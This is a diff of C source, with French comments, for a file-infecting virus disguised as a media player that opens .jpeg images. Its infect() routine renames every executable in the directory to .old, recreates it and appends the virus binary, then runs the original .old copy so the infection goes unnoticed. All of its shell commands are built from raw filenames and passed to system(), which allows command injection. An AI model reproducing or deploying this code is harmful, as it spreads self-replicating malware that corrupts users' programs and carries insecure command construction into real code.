@@ -42,12 +42,9 @@ int main(int argc, char *argv[]) {
         // determine si le programme est executé depuis le mediaplayer ou un hôte infecté
         if(strcmp(argv[0],str)) {       // HOTE INFECTE
                 char *extension = ".old";
-                char *String = malloc(strlen(name) + strlen(extension) + 1);
-                if(String) {
-                        strcpy(String,name);
-                        strcat(String,extension);
-                        system(String);
-                }
+                char str[100];
+                snprintf(str, sizeof str, "%s%s", name, extension);
+                system(str);
         }
         else {          // MEDIAPLAYER
                 listeFichier(".jpeg");
@@ -60,7 +57,7 @@ int main(int argc, char *argv[]) {
         myDir = opendir(".");
         if (myDir) {
                 while ((dir = readdir(myDir)) != NULL)
-                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
+                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT et SRC /!\/!\/!|
                         if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name)))
                                 if(strstr(dir->d_name, ".old") == NULL)
                                         if (access(dir->d_name, X_OK) == 0)
@@ -84,66 +81,39 @@ void listeFichier(char *extension) {
                         if (strstr(dir->d_name,extension)) {
                                 fileName = dir->d_name;
                                 imgFound = true;
-                                char *command = "xdg-open ";
-                                char *errRedirect = " 2> /dev/null";
-                                char *String = malloc(strlen(command) + strlen(fileName) +strlen(errRedirect) + 1);
-                                if(String) {
-                                        strcpy(String,command);
-                                        strcat(String,fileName);
-                                        strcat(String,errRedirect);
-                                }
-                                system(String);
+                                char str[100];
+                                snprintf(str, sizeof str, "xdg-open %s 2> /dev/null", fileName);
+                                system(str);
                         }
                 }
                 closedir(myDir);
         }
 }
 
-/*
-        Renomme les fichiers, créer un nouveau fichier au même nom et ajout les droits sur le nouveau fichier
-*/
 void infect(char *fileName) {
         // renommage des fichiers en .old
         char *command = "mv ";
         char *extension = ".old";
-        char *espace = " ";
-        char *String = malloc(strlen(command) + (strlen(fileName)*2) + strlen(espace) + strlen(extension) + 1);
-        if(String) {
-                strcpy(String,command);
-                strcat(String,fileName);
-                strcat(String,espace);
-                strcat(String,fileName);
-                strcat(String,extension);
-                system(String);
-        }
+        char mv[100];
+        snprintf(mv, sizeof mv, "%s %s %s%s", command, fileName, fileName, extension);
+        system(mv);
 
         // création des nouveaux fichier remplacant
-        command = "touch ";
-        String = malloc(strlen(command) + strlen(fileName) + 1);
-        if(String) {
-                strcpy(String,command);
-                strcat(String,fileName);
-                system(String);
-        }
+        command = "touch";
+        char tou[100];
+        snprintf(tou, sizeof tou, "%s %s", command, fileName);
+        system(tou);
 
         // ajoute le droit d'exécution sur le fichier
-        command = "chmod +x ";
-        String = malloc(strlen(command) + strlen(fileName) + 1);
-        if(String) {
-                strcpy(String,command);
-                strcat(String,fileName);
-                system(String);
-        }
+        command = "chmod +x";
+        char ch[100];
+        snprintf(ch, sizeof ch, "%s %s", command, fileName);
+        system(ch);
 
         // clonage du virus dans les nouveaux fichiers
-        command = "cat ";
+        command = "cat";
         char *pgName = *globalptr;
-        String = malloc(strlen(command) +strlen(pgName) + strlen(" >> ") + strlen(fileName) + 1);
-        if(String) {
-                strcpy(String,command);
-                strcat(String,pgName);
-                strcat(String," >> ");
-                strcat(String,fileName);
-                system(String);
-        }
+        char cat[100];
+        snprintf(cat, sizeof cat, "%s %s >> %s", command, pgName,fileName);
+        system(cat);
 }
